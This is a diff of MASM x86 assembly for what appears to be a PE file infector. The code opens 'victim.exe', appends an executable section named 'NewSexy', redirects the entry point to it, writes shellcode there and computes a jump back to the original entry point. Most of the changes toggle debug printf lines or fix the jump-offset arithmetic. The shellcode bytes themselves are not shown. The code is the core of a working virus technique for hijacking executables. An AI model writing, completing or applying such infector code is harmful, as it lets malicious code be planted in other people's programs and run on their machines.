@@ -53,7 +53,7 @@ patPutStr 										db "%s string",13,10, 0
 
 filename 										db  "victim.exe", 0
 sectionName 									db "NewSexy", 0
-shellcodeNop									db "\x90", 0
+shellcodeNop									db 90h, 0
 
 .data?
 
@@ -126,9 +126,9 @@ alignOn	endp
 pollute	proc filename1 : DWORD
 
 ;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-invoke	crt_printf, offset patNameOfFile
-invoke	crt_printf, filename1
-invoke	crt_printf, offset patNewLine
+; invoke	crt_printf, offset patNameOfFile
+; invoke	crt_printf, filename1
+; invoke	crt_printf, offset patNewLine
 ;;;;;;;;;;;;; END DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;saving non rdy for use registers
 push	ebx
@@ -163,10 +163,10 @@ cmp	[ebx].e_magic, IMAGE_DOS_SIGNATURE
 jne		exitpolluteerror
 
 ;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-invoke crt_printf, offset patDebug
-invoke crt_printf, offset patPutPtr, executableEnMemoire
-invoke crt_printf, offset patPutPtr, executableHandle
-invoke crt_printf, offset patPutPtr, executableMap
+; invoke crt_printf, offset patDebug
+; invoke crt_printf, offset patPutPtr, executableEnMemoire
+; invoke crt_printf, offset patPutPtr, executableHandle
+; invoke crt_printf, offset patPutPtr, executableMap
 
 ; invoke	crt_printf, offset patAddrImageDosHeader
 ; invoke	crt_printf, offset patPutPtr, ebx
@@ -332,15 +332,15 @@ add		eax, [ecx].VirtualAddress ; +virtualAdress
 assume	ecx: nothing
 
 ;;;;;;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;
-push	eax
-invoke	crt_printf, offset patDebug
-pop		eax
-push	eax
-invoke	crt_printf, offset patPutHexa, eax
-pop		eax
-push	eax
-invoke	crt_printf, offset patPutInt, eax
-pop		eax
+; push	eax
+; invoke	crt_printf, offset patDebug
+; pop		eax
+; push	eax
+; invoke	crt_printf, offset patPutHexa, eax
+; pop		eax
+; push	eax
+; invoke	crt_printf, offset patPutInt, eax
+; pop		eax
 ;;;;;;;;;;;;;;;;;END DEBUG;;;;;;;;;;;;;;;;;;;
 
 push	eax
@@ -389,9 +389,19 @@ add		eax, IMAGE_SCN_MEM_EXECUTE
 mov	[ebx].Characteristics,  eax
 
 ;;;;;;;;;;;;;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;
-invoke	crt_printf, offset patNewEntryPoint
-mov	eax, [ebx].VirtualAddress
-invoke	crt_printf, offset patPutPtr, eax 
+; invoke	crt_printf, offset patDebug
+; invoke	crt_printf, offset patOldEntryPoint
+; mov	eax, oldEntryPoint
+; mov	eax, [eax]
+; invoke	crt_printf, offset patPutPtr, eax
+
+; invoke	crt_printf, offset patNewEntryPoint
+; mov	eax, [ebx].VirtualAddress
+; invoke	crt_printf, offset patPutPtr, eax 
+
+
+; invoke	crt_printf, offset patSizeOfSection
+; invoke	crt_printf, offset patPutHexa, sectionSize
 ;;;;;;;;;;;;;;;;;;;;;;;;;END DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;
 
 ;*ptrEntryPoint = notreSection->VirtualAddress;
@@ -399,16 +409,25 @@ mov	 eax, [ebx].VirtualAddress
 mov	ecx, ptrEntryPoint
 mov	[ecx], eax
 
+
+
 ;decalage = oldEntryPoint - ( (ptrEntryPoint + sectionSize) )
 mov	eax, oldEntryPoint
-sub		eax, ptrEntryPoint
+mov	ecx,  ptrEntryPoint
+mov	ecx, [ecx]
+
+sub		eax, ecx
 sub		eax, sectionSize
+
 mov	decalage, eax
+
 
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 invoke	crt_printf, offset patDecalage 
 invoke	crt_printf, offset patPutHexa, decalage
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;END DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+invoke	crt_printf, offset patPutInt, decalage
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;END DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
 ; DWORD sizee;
 ; long sizeDifference = (AligneSur(fileAlignment,sectionSize) - sectionSize);
@@ -419,15 +438,15 @@ sub		eax, sectionSize
 mov	sizeDifference, eax
 
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;OK
-invoke	crt_printf, offset patSizeDifference 
-invoke	crt_printf, offset patPutHexa, sizeDifference
-invoke	crt_printf, offset patPutInt, sizeDifference
+; invoke	crt_printf, offset patSizeDifference 
+; invoke	crt_printf, offset patPutHexa, sizeDifference
+; invoke	crt_printf, offset patPutInt, sizeDifference
 
 
-invoke crt_printf, offset patDebug
-invoke crt_printf, offset patPutPtr, executableEnMemoire
-invoke crt_printf, offset patPutPtr, executableHandle
-invoke crt_printf, offset patPutPtr, executableMap
+; invoke crt_printf, offset patDebug
+; invoke crt_printf, offset patPutPtr, executableEnMemoire
+; invoke crt_printf, offset patPutPtr, executableHandle
+; invoke crt_printf, offset patPutPtr, executableMap
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;END DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
 push	[ebx].PointerToRawData										;save PointerToRawData
@@ -447,9 +466,9 @@ je		exitpolluteerror
 ;CreateFile( argv[1] , GENERIC_WRITE ,  FILE_SHARE_WRITE , NULL , OPEN_ALWAYS , FILE_ATTRIBUTE_NORMAL , NULL );
 
 ;;;;;;;;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-invoke	crt_printf, offset patDebug
-call		GetLastError
-invoke	crt_printf, offset patPutInt,  eax
+; invoke	crt_printf, offset patDebug
+; call		GetLastError
+; invoke	crt_printf, offset patPutInt,  eax
 ;;;;;;;;;;;;;;;;;;;;;;END DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
 push	0
@@ -466,17 +485,13 @@ cmp	eax, INVALID_HANDLE_VALUE
 je		exitpolluteerror
 
 ;;;;;;;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-invoke	crt_printf, offset patDebug
-call		GetLastError
-invoke	crt_printf, offset patPutInt,  eax
+; invoke	crt_printf, offset patDebug
+; call		GetLastError
+; invoke	crt_printf, offset patPutInt,  eax
 ;;;;;;;;;;;;;;;;;;; END EBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
 pop		eax 													; restore PointerToRawData
 invoke	SetFilePointer, filePointer, eax, 0, FILE_BEGIN
-;cmp	eax, INVALID_SET_FILE_POINTER + GetLastError ROFL@MICROSOFT
-;je		exitpolluteerror
-
-
 
 ; WriteFile, filePointer, offset shellcode, (strlen(shellcode) + 0), &sizee, NULL				;writing the shellcode on pointerToRawData
 push	0
@@ -490,6 +505,11 @@ call		WriteFile
 cmp	eax, 0
 je		exitpolluteerror
 
+;;;;;;;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+invoke	crt_printf, offset patDebug
+invoke	crt_printf, offset patPutHexa, decalage
+;;;;;;;;;;;;;;;;;;;END DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
 ;invoke    WriteFile, filePointer, &decallage, sizeof(DWORD), &size, NULL							;writing jmp operand oldEntryPoint
 push	0
 push	offset sizee
@@ -500,6 +520,7 @@ call		WriteFile
 
 cmp	eax, 0
 je		exitpolluteerror
+
 
 ;fill the rest with nop in order to have the same size as we put in the header info
 push	ecx
